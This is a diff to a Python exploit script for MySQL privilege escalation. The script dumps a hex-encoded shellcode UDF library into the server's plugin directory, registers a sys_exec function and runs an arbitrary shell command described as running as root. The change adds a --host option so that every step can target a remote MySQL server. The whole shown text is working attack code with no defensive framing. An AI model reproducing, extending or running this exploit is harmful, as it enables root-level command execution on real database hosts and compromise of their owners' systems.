@@ -52,6 +52,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument('--username', '-u', help='MySQL username', type=str, required=True)
 parser.add_argument('--password', '-p', help='MySQL password', type=str)
 parser.add_argument('--command', '-c', help='Command ran as root', type=str)
+parser.add_argument('--host', help='MySQL host', type=str, default='127.0.0.1')
 parser.add_argument('--port', help='MySQL port', type=str, default='3306')
 
 args = parser.parse_args()
@@ -62,7 +63,7 @@ password=args.password
 if not password:
         password=''
 
-cmd='mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select @@plugin_dir \G"'
+cmd='mysql --host ' + args.host + ' --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select @@plugin_dir \G"'
 plugin_str = subprocess.check_output(cmd, shell=True)
 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
 res = bool(plugin_dir)
@@ -83,7 +84,7 @@ udf_outfile = plugin_dir_ + udf_filename
 # set @outputpath := @@plugin_dir; select concat...;
 
 print "Trying to create a udf library...";
-os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
+os.system('mysql --host ' + args.host + ' --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
 res = os.path.isfile(udf_outfile)
 
 if not res:
@@ -91,10 +92,10 @@ if not res:
 
 print "UDF library crated successfully: %s" % udf_outfile;
 print "Trying to create sys_exec..."
-os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)
+os.system('mysql --host ' + args.host + ' --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)
 
 print "Checking if sys_exec was crated..."
-cmd='mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
+cmd='mysql --host ' + args.host + ' --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
 res = subprocess.check_output(cmd, shell=True);
 
 if (res == ''):
@@ -103,4 +104,4 @@ if (res == ''):
 if res:
         print "sys_exec was found: %s" % res
         print "Running provided shell command..."
-        os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select sys_exec(\'' + args.command + '\')"')
+        os.system('mysql --host ' + args.host + ' --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select sys_exec(\'' + args.command + '\')"')
